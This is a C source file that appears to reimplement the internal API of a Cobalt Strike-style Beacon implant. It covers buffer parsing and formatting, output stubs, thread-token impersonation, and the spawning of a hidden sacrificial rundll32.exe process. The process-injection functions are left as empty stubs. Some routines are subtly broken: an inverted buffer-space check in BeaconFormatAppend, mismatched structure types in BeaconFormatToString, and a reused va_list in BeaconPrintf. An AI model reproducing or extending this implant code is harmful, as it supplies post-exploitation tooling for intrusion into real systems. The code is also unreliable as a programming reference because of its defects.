#include "api.h"
#include "Command.h"

#define DEFAULTPROCESSNAME "rundll32.exe"
#define X86PATH "SysWOW64"
#define X64PATH "System32"

void BeaconInternalAPI(Beacon_Internal_Api* beaconInternalApi)
{
	*beaconInternalApi = (Beacon_Internal_Api){
		LoadLibraryA,
		FreeLibrary,
		GetProcAddress,
		GetModuleHandleA,
		BeaconDataParse,
		BeaconDataPtr,
		BeaconDataInt,
		BeaconDataShort,
		BeaconDataLength,
		BeaconDataExtract,
		BeaconFormatAlloc,
		BeaconFormatReset,
		BeaconFormatPrintf,
		BeaconFormatAppend,
		BeaconFormatFree,
		BeaconFormatToString,
		BeaconFormatInt,
		BeaconOutput,
		BeaconPrintf,
		BeaconErrorD,
		BeaconErrorDD,
		BeaconErrorNA,
		BeaconUseToken,
		BeaconIsAdmin,
		BeaconRevertToken,
		BeaconGetSpawnTo,
		BeaconCleanupProcess,
		BeaconInjectProcess,
		BeaconSpawnTemporaryProcess,
		BeaconInjectTemporaryProcess,
		toWideChar
	};
}

// Data Api
datap* BeaconDataAlloc(int size)
{
	datap* parser = (datap*)malloc(sizeof(datap));
	if (!parser)
		return NULL;

	char* buffer = (char*)malloc(size);
	if (!buffer)
	{
		free(parser);
		return NULL;
	}

	memset(buffer, 0, size);
	BeaconDataParse(parser, buffer, size);
	return parser;
}

void BeaconDataFree(datap* parser)
{
	BeaconDataZero(parser);
	free(parser->original);
	free(parser);
}

void BeaconDataParse(datap* parser, char* buffer, int size) {
	*parser = (datap){ buffer, buffer, size, size };
}

char* BeaconDataPtr(datap* parser, int size)
{
	if (parser->length < size)
		return NULL;

	char* data = parser->buffer;

	parser->length -= size;
	parser->buffer += size;

	return data;
}

int BeaconDataInt(datap* parser)
{
	if (parser->length < sizeof(int))
		return 0;

	int data = ntohl(*(int*)parser->buffer);

	parser->length -= sizeof(int);
	parser->buffer += sizeof(int);

	return data;
}

short BeaconDataShort(datap* parser)
{
	if (parser->length < sizeof(short))
		return 0;

	short data = ntohs(*(short*)parser->buffer);

	parser->length -= sizeof(short);
	parser->buffer += sizeof(short);

	return data;
}

char BeaconDataByte(datap* parser)
{
	if (parser->length < sizeof(char))
		return 0;

	char data = *(char*)parser->buffer;

	parser->length -= sizeof(char);
	parser->buffer += sizeof(char);

	return data;
}

char* BeaconDataStringPointer(datap* parser)
{
	int size = BeaconDataInt(parser);

	if (size == 0)
		return NULL;

	return BeaconDataPtr(parser, size);
}

char* BeaconDataStringPointerCopy(datap* parser, int size)
{
	char* buffer = (char*)malloc(size);
	BeaconDataStringCopy(parser, buffer, size);
	return buffer;
}

int BeaconDataStringCopySafe(datap* parser, char* buffer, int size)
{
	if (parser->length == 0)
		return 0;

	int bufferSize = parser->length + 1;
	if (bufferSize >= size)
		return 0;

	char* ptr = BeaconDataPtr(parser, parser->length);
	if (!ptr)
		return 0;

	memcpy(buffer, ptr, parser->length);
	buffer[parser->length] = 0;
	return bufferSize;
}

int BeaconDataStringCopy(datap* parser, char* buffer, int size)
{
	int bufferSize = parser->length + 1;
	if (bufferSize >= size)
		return 0;

	memcpy(buffer, parser->buffer, parser->length);
	buffer[parser->length] = 0;
	return bufferSize;
}

char* BeaconDataOriginal(datap* parser)
{
	return parser->original;
}

char* BeaconDataBuffer(datap* parser)
{
	return parser->buffer;
}

int BeaconDataLength(datap* parser)
{
	return parser->length;
}

char* BeaconDataLengthAndString(datap* parser, sizedbuf* sb)
{
	int size = BeaconDataInt(parser);
	char* data = BeaconDataPtr(parser, size);

	*sb = (sizedbuf){ data, size };

	return sb->buffer;
}

char* BeaconDataExtract(datap* parser, int* size)
{
	sizedbuf sb;
	BeaconDataLengthAndString(parser, &sb);

	if (size)
		*size = sb.size;

	if (sb.size == 0)
		return NULL;

	return sb.buffer;
}

void BeaconDataZero(datap* parser)
{
	memset(parser->original, 0, parser->size);
}

// Format Api
void BeaconFormatAlloc(formatp* format, int maxsz)
{
	char* buffer = (char*)malloc(maxsz);
	BeaconFormatUse(format, buffer, maxsz);
}

void BeaconFormatUse(formatp* format, char* buffer, int size)
{
	*format = (formatp){ buffer, buffer, 0, size };
}

void BeaconFormatReset(formatp* format)
{
	*format = (formatp){ format->original, format->original, 0, format->size };
}

void BeaconFormatAppend(formatp* format, char* text, int len)
{
	if (format->size - format->length >= len)
		return;

	if (len == 0)
		return;

	memcpy(format->buffer, text, len);
	format->buffer += len;
	format->length += len;
}

void BeaconFormatPrintf(formatp* format, char* fmt, ...)
{
	va_list args;
	va_start(args, fmt);

	int len = vsnprintf(format->buffer, format->size - format->length, fmt, args);
	format->buffer += len;
	format->length += len;

	va_end(args);
}

void BeaconFormatFree(formatp* format)
{
	/* note: we don't force memzero the buffer explicitly, as free is already overwritten to do that */
	free(format->original);
}

void BeaconFormatInt(formatp* format, int value)
{
	value = htonl(value);
	BeaconFormatAppend(format, (char*)&value, sizeof(int));
}

void BeaconFormatShort(formatp* format, short value)
{
	value = htons(value);
	BeaconFormatAppend(format, (char*)&value, sizeof(short));
}

void BeaconFormatChar(formatp* format, char value)
{
	BeaconFormatAppend(format, (char*)&value, sizeof(char));
}

char* BeaconFormatOriginal(formatp* format)
{
	return format->original;
}

char* BeaconFormatBuffer(formatp* format)
{
	return format->buffer;
}

int BeaconFormatLength(formatp* format)
{
	return format->length;
}

char* BeaconFormatToString(formatp* format, int* size)
{
	if (!size)
		return NULL;

	*size = BeaconDataLength(format);
	return BeaconDataOriginal(format);
}

// Output Api
void BeaconPrintf(int type, char* fmt, ...) {
	/* Change to maintain internal buffer, and return after done running. */
	va_list ArgList = 0;
	va_start(ArgList, fmt);
	int size = vprintf(fmt, ArgList);
	if (size > 0)
	{
		unsigned char* buffer = (unsigned char*)malloc(size + 1);
		buffer[size] = 0;
		vsprintf_s(buffer, size + 1, fmt, ArgList);
		DataProcess(buffer, size, 0);
		memset(buffer, 0, size);
		free(buffer);
	}
}

void BeaconOutput(int type, char* data, int len) {
	printf("BeaconOutput Called\n");
}

void BeaconErrorD(int type, int d1) {
	printf("BeaconErrorD Called\n");
}

void BeaconErrorDD(int type, int d1, int d2) {
	printf("BeaconErrorDD Called\n");
}

void BeaconErrorNA(int type, int d1, int d2) {
	printf("BeaconErrorNA Called\n");
}

// Token Api
BOOL BeaconUseToken(HANDLE token) {
	/* Probably needs to handle DuplicateTokenEx too */
	SetThreadToken(NULL, token);
	return TRUE;
}

void BeaconRevertToken(void) {
	if (!RevertToSelf()) {
		fprintf(stderr, "RevertToSelf Failed!\n");
	}
	return;
}

BOOL BeaconIsAdmin(void) {
	printf("BeaconIsAdmin Called\n");
	return FALSE;
}

// Spawn+Inject Api
void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
	char* tempBufferPath = NULL;
	if (buffer == NULL) {
		return;
	}
	if (x86) {
		tempBufferPath = "C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME;
	}
	else {
		tempBufferPath = "C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME;
	}

	if ((int)strlen(tempBufferPath) > length) {
		return;
	}
	memcpy(buffer, tempBufferPath, strlen(tempBufferPath));
	return;
}

BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
	BOOL bSuccess = FALSE;
	if (x86) {
		bSuccess = CreateProcessA(NULL, (char*)"C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
	}
	else {
		bSuccess = CreateProcessA(NULL, (char*)"C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
	}
	return bSuccess;
}

void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {
	/* Leaving this to be implemented by people needing/wanting it */
	return;
}

void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
	/* Leaving this to be implemented by people needing/wanting it */
	return;
}

void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
	(void)CloseHandle(pInfo->hThread);
	(void)CloseHandle(pInfo->hProcess);
	return;
}

// Utility Api
BOOL toWideChar(char* src, wchar_t* dst, int max) {
	if (max < sizeof(wchar_t))
		return FALSE;
	return MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, src, -1, dst, max / sizeof(wchar_t));
}
